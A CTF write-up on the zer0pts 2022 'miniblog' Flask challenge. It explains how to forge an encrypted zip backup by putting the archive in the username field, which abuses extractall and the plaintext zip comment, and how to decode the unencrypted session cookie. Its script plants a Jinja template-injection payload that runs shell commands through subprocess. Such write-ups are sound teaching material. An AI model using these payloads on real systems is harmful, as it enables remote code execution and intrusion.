zer0pts CTF - Miniblog WriteUp
==============================

## Introduction

The `miniblog` series was a nice pair of web challenges during the [zer0pts CTF 2022](https://2022.ctf.zer0pts.com/).
We are given a `flask` web application, though detailed configuration of the server was not made public.

Let's step through the core pieces really quickly:
At the highest level, the given application renders posts created by the user:
```python
@app.route('/post/<title>', methods=['GET'])
def get_post(title):
    db = get_database()
    if db is None:
        return flask.redirect('/login')

    err, post = db.read(title)
    if err:
        return flask.abort(404, err)

    return flask.render_template_string(post['content'],
                                        title=post['title'],
                                        author=post['author'],
                                        date=post['date'])
```

We can create arbitrary users using the `/api/login` endpoint:
```python
@app.route('/api/login', methods=['POST'])
def api_login():
    try:
        data = json.loads(flask.request.data)
        assert isinstance(data['username'], str)
        assert isinstance(data['password'], str)
    except:
        return flask.abort(400, "Invalid request")

    flask.session['username'] = data['username']
    flask.session['passhash'] = hashlib.md5(data['password'].encode()).hexdigest()
    flask.session['workdir'] = os.urandom(16).hex()
    return flask.jsonify({'result': 'OK'})
```

Additionally the app supports the creation of backups.
Those backups will be encrypted ZIP-files containing all posts created by the user.
The encryption will be performed using [AES in CFB mode](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_Feedback_%28CFB%29):
```python
# snip ..
    def export_posts(self, username, passhash):
        """Export all blog posts with encryption and signature"""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'a', zipfile.ZIP_DEFLATED) as z:
            # Archive blog posts
            for path in glob.glob(f'{self.workdir}/*.json'):
                z.write(path)
            # Add signature so that anyone else cannot import this backup
            z.comment = f'SIGNATURE:{username}:{passhash}'.encode()

        # Encrypt archive so that anyone else cannot read the contents
        buf.seek(0)
        iv = os.urandom(16)
        cipher = AES.new(app.encryption_key, AES.MODE_CFB, iv)
        encbuf = iv + cipher.encrypt(buf.read())
        return None, base64.b64encode(encbuf).decode()

    def import_posts(self, b64encbuf, username, passhash):
        """Import blog posts from backup file"""
        encbuf = base64.b64decode(b64encbuf)
        cipher = AES.new(app.encryption_key, AES.MODE_CFB, encbuf[:16])
        buf = io.BytesIO(cipher.decrypt(encbuf[16:]))

        try:
            with zipfile.ZipFile(buf, 'r', zipfile.ZIP_DEFLATED) as z:
                # Check signature
                if z.comment != f'SIGNATURE:{username}:{passhash}'.encode():
                    return 'This is not your database'
                # Extract archive
                z.extractall()
        except:
            return 'The database is broken'

        return None
```

## Finding vulnerable pieces

Starting with view a post using the `/post/<title>` endpoint its content gets rendered with Jinja, thus if we were able to fully control `post["content"]` we could perform server side template injection.
The input if sanitized well though when creating a new post:

```python
    def add(self, title, author, content):
        """Add new blog post"""
        # Validate title and content
        if len(title) == 0: return 'Title is emptry', None
        if len(title) > 64: return 'Title is too long', None
        if len(content) == 0     : return 'HTML is empty', None
        if len(content) > 1024*64: return 'HTML is too long', None
        if '{%' in content:
            return 'The pattern "{%" is forbidden', None

        for m in re.finditer(r"{{", content):
            p = m.start()
            if not (content[p:p+len('{{title}}')] == '{{title}}' or \
                    content[p:p+len('{{author}}')] == '{{author}}' or \
                    content[p:p+len('{{date}}')] == '{{date}}'):
                return 'You can only use "{{title}}", "{{author}}", and "{{date}}"', None

        # Save the blog post
        now = datetime.datetime.now().strftime("%Y/%m/%d %H:%M:%S")
        post_id = Database.to_snake(title)
        data = {
            'title': title,
            'id': post_id,
            'date': now,
            'author': author,
            'content': content
        }
        with open(f'{self.workdir}/{post_id}.json', "w") as f:
            json.dump(data, f)

        return None, post_id
```

Another thing that sticks out is the use of the insecure API `ZipFile.extractall()` which may create arbitrary files on the system.
However since archives are encrypted, we cannot simply create a fake backup to our liking.

Or can we?

Notice how the `export_posts()` function adds a *signature* to the archive by editing the comment.
Looking through the high level description of the [Zip File Format](https://en.wikipedia.org/wiki/ZIP_%28file_format%29), we will find that the comment is simply appended in plain text at the end of the central directory header.
Since this signature contains our username, we can make the server encrypt data that we fully control!
Therefor an idea to that would be creating a username which is actually a valid ZIP-file as the `export_posts()` function would create (without encryption, as the server will do this for us :)
The only limitation we have, is the fact that the content has to be a valid UTF-8 string, as this is the default encoding used.

I created a few archives and checked which fields impose a problem. 
First thing I noticed is, that we actually do not need to use the DEFLATE option, we can simply use STORE, making things a lot easier.
The flag for extraction in `import_posts()` is luckily ignored silently.

Beside that, the fields that stick out are the CRC32 checksum, the time of creation and the file permissions.
In order to get the checksum into a sane range, bruteforce is a decent choice. 
The time of creation can be anything really.
A good choice for file permissions is `044` as this is valid ASCII and reading is sufficient for us.

I created the following script to create the ZIP file content:
```python
import json
import string
import struct
import random
import zlib
import unittest.mock as mock

WORKDIR = "a" * 16

def p32(i):
    return struct.pack("<I", i)

content = {
    "title": "foobar",
    "id": "foobar",
    "date": "2022/03/03 12:12:12",
    "author": "fakeauthor",
    "content": "{{ request.application.__globals__.__builtins__.__import__('subprocess').check_output('ls',shell=True) }}"
}

while True:
    pad = random.choices(string.printable, k=4)
    pad = "".join(pad)

    content2 = content.copy()
    content2["content"] += pad

    checksum = p32(zlib.crc32(json.dumps(content2).encode())) # 4 bytes CRC32
    try:
        checksum.decode()
    except UnicodeDecodeError:
        continue
    else:
        content = content2
        break

os.makedirs(WORKDIR, exist_ok=True)
with open(f"{WORKDIR}/foobar.json", "w") as fout:
    json.dump(content, fout)
os.chmod(f"{WORKDIR}/foobar.json", 0o044)

buf = io.BytesIO()
username = "a" * 12
passhash = "47bce5c74f589f4867dbd57e9ca9f808" # aaa

def fake_localtime(*args):
    return [1980, 0, 0, 0, 0, 0, 0, 0, 0]

with mock.patch("zipfile.time.localtime", new=fake_localtime):
    with zipfile.ZipFile(buf, 'a', zipfile.ZIP_STORED) as z:
        # Archive blog posts
        z.write(f"{WORKDIR}/foobar.json")
        z.comment = f'SIGNATURE:{username}:{passhash}'.encode()

buf.seek(0)
blob = buf.read()

print(blob.decode())
```

We can use the created ZIP file as a new username.
When we export this users posts, we can slice the encrypted output and extract the encrypted version of the archive.
After that, the user `aaaaaaaaaaaa` will be able to import it (with password `aaa`)

You may have noticed, that we assumed to know the `WORKDIR` for user `aaaaaaaaaaaa`.
Right now this is not the case as it is generated when the user is created and stored in the session cookie.
At this point I was chasing red herrings because I assumed that the cookie would be encrypted.
Eventually I realized that this is not the case afterall ( *facepalm* ).

To decode the token we can use the libraries flask is using for that purpose:
```python
import hashlib

from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

signer_kwargs = {
    'key_derivation': 'hmac',
    'digest_method': hashlib.sha1
}
serializer = URLSafeTimedSerializer(
    b'',
    salt='cookie-session',
    serializer=TaggedJSONSerializer(),
    signer_kwargs=signer_kwargs
)

print(serializer.loads_unsafe(".eJw9yjEOwjAMQNG7eO6Qgp3Y3MaxHRUhCkqEGBB3b6b-8en_4K1jbDo2uAGWakFWsBFLQ87Fq1MJMZXGiWGBz4i-6zPmrWfTv6_-8HufnC-JIgeJVlvROKgiJUu5ObLLFf4HK2wi_Q.Yjx9Cw._s9bYjROsODfSKWXs91aD6QUxBU"))
```

Now everything left to do is chaining the steps together ;)

